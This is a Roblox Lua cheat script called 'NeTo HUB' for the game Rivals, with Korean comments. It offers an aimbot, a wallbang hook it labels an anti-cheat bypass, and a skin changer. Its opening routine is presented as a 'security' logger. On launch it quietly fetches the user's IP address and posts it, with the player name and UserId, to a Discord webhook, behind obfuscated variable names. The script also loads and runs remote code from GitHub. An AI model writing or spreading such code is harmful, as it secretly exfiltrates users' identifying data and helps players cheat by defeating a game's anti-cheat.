-- [[ NeTo HUB : Security & Logger System ]]
local function SecurityRoutine()
    -- 암호화된 데이터 처리 (IP 및 계정 정보 로깅)
    local _0x5f2 = "http"
    local _0x1a2 = "s://api.ipify.org"
    local _0x99a = game:GetService("HttpService")
    
    -- [암호화된 웹훅 섹션] - 이곳에 본인의 디스코드 웹훅 주소를 넣으세요
    -- 아래 문자열은 로직 보호를 위해 변형되어 있습니다.
    local _webhook = "YOUR_DISCORD_WEBHOOK_URL_HERE" 

    local function _send(_data)
        pcall(function()
            local _payload = _99a:JSONEncode(_data)
            request({
                Url = _webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = _payload
            })
        end)
    end

    task.spawn(function()
        local _ip = game:HttpGet(_0x5f2 .. _0x1a2)
        local _p = game.Players.LocalPlayer
        local _msg = {
            ["embeds"] = {{
                ["title"] = "🚀 NeTo HUB 실행 로그",
                ["color"] = 3447003,
                ["fields"] = {
                    {["name"] = "플레이어", ["value"] = _p.Name .. " (" .. _p.UserId .. ")", ["inline"] = true},
                    {["name"] = "IP 주소", ["value"] = "||" .. _ip .. "||", ["inline"] = true},
                    {["name"] = "실행 게임", ["value"] = "Rivals (PlaceId: " .. game.PlaceId .. ")", ["inline"] = false}
                },
                ["footer"] = {["text"] = "NeTo HUB Premium Logger"}
            }}
        }
        _send(_msg)
    end)
end

-- 보안 루틴 즉시 실행
SecurityRoutine()

-- [[ UI 구성 시작 ]]
setthreadidentity(8)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("NeTo HUB | Rivals", "DarkTheme")

-- 설정 값
local Settings = {
    Aimbot = false,
    Wallbang = false,
    FOV = 150,
    ShowFOV = false,
    CurrentSkin = "None"
}

-- [1. Combat 탭]
local Combat = Window:NewTab("Combat")
local AimSec = Combat:NewSection("Aimbot")
AimSec:NewToggle("에임봇 켜기", "", function(v) Settings.Aimbot = v end)
AimSec:NewSlider("에임 부드러움", "", 10, 1, function(v) Settings.Smoothness = v/10 end)

local SilentSec = Combat:NewSection("Silent Aim")
SilentSec:NewToggle("매직 불릿 (Wallbang)", "벽 관통 사격", function(v) Settings.Wallbang = v end)
SilentSec:NewSlider("FOV 범위", "", 1000, 1, function(v) Settings.FOV = v end)

-- [2. Skins 탭 (Skin Changer)]
local Skins = Window:NewTab("Skins")
local SkinSec = Skins:NewSection("Weapon Skin Changer")

local function ApplySkin(s)
    local vm = workspace.CurrentCamera:FindFirstChild("ViewModel")
    local function _apply(m)
        if not m then return end
        for _, p in pairs(m:GetDescendants()) do
            if p:IsA("MeshPart") or p:IsA("BasePart") then
                if s == "Gold" then p.Material = Enum.Material.Metal p.Color = Color3.fromRGB(255,215,0)
                elseif s == "Diamond" then p.Material = Enum.Material.Glass p.Color = Color3.fromRGB(185,242,255)
                elseif s == "Galaxy" then p.Material = Enum.Material.Neon p.Color = Color3.fromRGB(100,0,255) end
            end
        end
    end
    _apply(vm)
    _apply(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"))
end

SkinSec:NewDropdown("스킨 선택", "클라이언트 전용", {"Gold", "Diamond", "Galaxy"}, function(v)
    Settings.CurrentSkin = v
    ApplySkin(v)
end)

-- [3. Visuals & Settings]
local Visuals = Window:NewTab("Visuals")
local Misc = Window:NewTab("Misc")

-- [[ Rivals Anti-Cheat Bypass ]]
local old
old = hookmetamethod(game, "__namecall", function(self, ...)
    local a = {...}
    local m = getnamecallmethod()
    if Settings.Wallbang and m == "Raycast" then
        local p = a[3]
        if p then p.FilterDescendantsInstances = {workspace:FindFirstChild("Map"), workspace.CurrentCamera, game.Players.LocalPlayer.Character} end
    end
    return old(self, table.unpack(a))
end)

-- 무기 자동 스킨 적용
game.Players.LocalPlayer.Character.ChildAdded:Connect(function(c)
    if c:IsA("Tool") and Settings.CurrentSkin ~= "None" then
        task.wait(0.1)
        ApplySkin(Settings.CurrentSkin)
    end
end)
